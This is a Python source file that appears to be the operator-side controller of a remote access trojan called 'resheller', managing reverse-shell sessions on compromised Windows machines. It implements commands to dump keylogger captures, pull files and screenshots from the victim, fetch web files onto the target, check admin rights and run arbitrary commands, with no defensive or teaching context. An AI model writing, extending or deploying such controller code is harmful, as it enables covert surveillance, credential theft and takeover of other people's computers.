#!/usr/bin/env python3
from base64 import b64decode
from json import dumps, loads
from os import path, makedirs

from src.stdout.color import Color
from time import strftime
from pathlib import Path


class Shell:

    def __init__(self, ips, targets, sessions):
        self.ips = ips
        self.targets = targets
        self.target = targets[sessions]
        self.ip, _ = ips[sessions]
        self._dir = f"{str(Path.home())}/.resheller"

    def make_dir(self):
        if not path.isdir(self._dir):
            makedirs(self._dir)

    def keylogger_dump(self):
        log_file = f'keylog_{strftime("%Y.%m.%d-%H.%M.%S")}.txt'
        self.make_dir()
        with open(f"{self._dir}/{log_file}", 'w') as log:
            log.write(self.safe_recv())
        print(Color(f"[+] Dumped Logs to {self._dir}\n").grn())

    def download(self, command):
        self.make_dir()
        with open(f"{self._dir}/{command[9:]}", 'wb') as file:
            file.write(b64decode(self.safe_recv()))
        print(Color(f'[+] Downloaded "{command[9:]}" to {self._dir}\n').grn())

    def screenshot(self):
        self.make_dir()
        count = 1
        while True:
            screenshot = f"screenshot{count}"
            if path.isfile(screenshot):
                count += 1
            else:
                break
        with open(f"{self._dir}/{screenshot}", "wb") as shot:
            image = self.safe_recv()
            image_decoded = b64decode(image)
            if image_decoded[:3] == "[!]":
                print(Color(image_decoded).b_red())
            else:
                shot.write(image_decoded)
            shot.close()
        print(Color(f"[+] Saved {screenshot} to {self._dir}\n").grn())

    def safe_recv(self):
        data = "".encode('utf-8')
        while True:
            try:
                data = data + self.target.recv(1024)
                return loads(data)
            except ValueError:
                continue

    def safe_send(self, data):
        json_data = dumps(data)
        self.target.send(json_data.encode('utf-8'))

    def print_stdout(self):
        stdout = self.safe_recv()
        print(stdout)
        if stdout[:3] == "[+]":
            stdout = Color(stdout).b_grn()
        elif stdout[:3] == "[!]":
            stdout = Color(stdout).b_red()
        print(stdout)

    def get_path(self):
        self.safe_send("dir")
        stdout = self.safe_recv()
        for line in stdout.splitlines():
            line = line.strip()
            line_of = line[:12]
            d_of = "Directory of"
            if line_of == d_of:
                return line[13:]
        return

    @staticmethod
    def ps1(ip, win_path):
        host = f"{ip}:{win_path}"
        return input(f'{Color("{").b_blu()}{Color("shell").b_red()}'
                     f'{Color("@").b_blu()}{Color(host).b_red()}'
                     f'{Color("}>").b_blu()} ')

    @staticmethod
    def help():
        help_options = (
            "\n"
            "help            --> print this help message\n"
            "download <path> --> download file from target\n"
            "upload <path>   --> upload file from target\n"
            "get <url>       --> download file from website to target\n"
            "screenshot      --> take screenshot on target\n"
            "check           --> check for admin privileges\n"
            "keylog <opt>    --> <start> --> start keylogger on target\n"
            "                    <dump>  --> retrieve logs from target\n"
            "quit            --> exit reverse shell\n"
        )
        print(Color(help_options).ylw())

    def exit_shell(self):
        self.target.close()
        self.targets.remove(self.target)
        self.ips.remove(self.ip)

    def shell(self):
        print(Color("[+] Connection Established\n").b_grn())
        while True:
            win_path = self.get_path()
            command = self.ps1(self.ip, win_path)
            if command == "ls":
                command = "dir"
            if command == 'quit':
                break
            elif command == "exit":
                self.exit_shell()
                break
            elif command[:2] == 'cd':
                continue
            elif command[:15] == 'keylogger start':
                print(Color("[+] Started Keylogger").b_grn())
                continue
            elif command[:14] == "keylogger dump":
                self.keylogger_dump()
            elif command[:8] == "download":
                self.download(command)
            elif command[:10] == "screenshot":
                self.screenshot()
            elif command == "help":
                self.help()
            else:
                self.print_stdout()
